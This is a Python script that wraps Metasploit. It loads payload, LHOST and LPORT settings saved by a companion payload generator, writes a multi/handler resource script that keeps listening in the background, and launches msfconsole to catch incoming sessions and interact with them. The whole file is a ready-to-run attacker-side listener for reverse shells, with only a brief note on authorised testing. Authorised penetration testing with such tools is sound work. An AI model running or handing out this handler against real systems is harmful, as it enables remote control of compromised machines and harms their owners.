#!/usr/bin/env python3
"""
handler.py — Start a Metasploit multi/handler that matches your last payload.

Reads the settings saved by payload_gen.py (.last_payload.json), writes a small
msfconsole resource script, and launches msfconsole with it. The handler runs
in a real, interactive msfconsole — so when the payload fires, the session
opens right there and you interact with it normally (sysinfo, shell, etc).

Usage:
    python3 handler.py                 # use the last generated payload's settings
    python3 handler.py --show          # just print the settings, don't launch

Override on the command line if you want (otherwise the saved values are used):
    python3 handler.py -p <payload> --lhost <ip> --lport <port>

Legal note: only catch sessions from systems you own or are authorized to test.
"""

import os
import sys
import json
import shutil
import tempfile
import subprocess

SETTINGS_FILE = ".last_payload.json"


def load_settings():
    """Loads the saved payload settings, or exits with guidance."""
    if not os.path.exists(SETTINGS_FILE):
        sys.exit("[!] No saved payload found. Run payload_gen.py first,\n"
                 "    or pass -p/--lhost/--lport manually.")
    with open(SETTINGS_FILE) as f:
        return json.load(f)


def parse_args(settings):
    """Lets command-line flags override the saved settings."""
    payload = settings.get("payload")
    lhost = settings.get("lhost")
    lport = settings.get("lport")
    show_only = False

    args = sys.argv[1:]
    i = 0
    while i < len(args):
        a = args[i]
        if a == "--show":
            show_only = True
        elif a in ("-p", "--payload") and i + 1 < len(args):
            payload = args[i + 1]; i += 1
        elif a == "--lhost" and i + 1 < len(args):
            lhost = args[i + 1]; i += 1
        elif a == "--lport" and i + 1 < len(args):
            lport = args[i + 1]; i += 1
        else:
            sys.exit(f"[!] Unknown or incomplete argument: {a}")
        i += 1

    if not (payload and lhost and lport):
        sys.exit("[!] Missing payload / LHOST / LPORT (none saved and none given).")
    return payload, lhost, lport, show_only


def build_rc(payload, lhost, lport):
    """Writes a resource script that sets up and starts the handler."""
    rc = (
        "use exploit/multi/handler\n"
        f"set PAYLOAD {payload}\n"
        f"set LHOST {lhost}\n"
        f"set LPORT {lport}\n"
        "set ExitOnSession false\n"   # keep listening after a session opens
        "run -j\n"                      # run as a background job
    )
    fd, path = tempfile.mkstemp(suffix=".rc", prefix="handler_")
    with os.fdopen(fd, "w") as f:
        f.write(rc)
    return path, rc


def main():
    if not shutil.which("msfconsole"):
        sys.exit("[!] msfconsole not found in PATH. Is Metasploit installed?")

    settings = load_settings()
    payload, lhost, lport, show_only = parse_args(settings)

    rc_path, rc_text = build_rc(payload, lhost, lport)

    print("=" * 52)
    print("  Metasploit handler")
    print("=" * 52)
    print(f"  payload   {payload}")
    print(f"  LHOST     {lhost}")
    print(f"  LPORT     {lport}")
    print("-" * 52)
    print("Resource script:")
    for line in rc_text.strip().splitlines():
        print(f"  {line}")
    print("-" * 52)

    if show_only:
        print(f"[*] --show only. Resource script left at: {rc_path}")
        return

    print("[*] Launching msfconsole with the handler ...")
    print("    (the session will open here when the payload runs;")
    print("     use 'sessions -i <id>' to interact, Ctrl+C / 'exit' to quit)\n")

    try:
        # Hand over the terminal to msfconsole — it runs interactively.
        subprocess.run(["msfconsole", "-q", "-r", rc_path])
    finally:
        # Clean up the temp resource script when msfconsole exits.
        if os.path.exists(rc_path):
            os.remove(rc_path)


if __name__ == "__main__":
    main()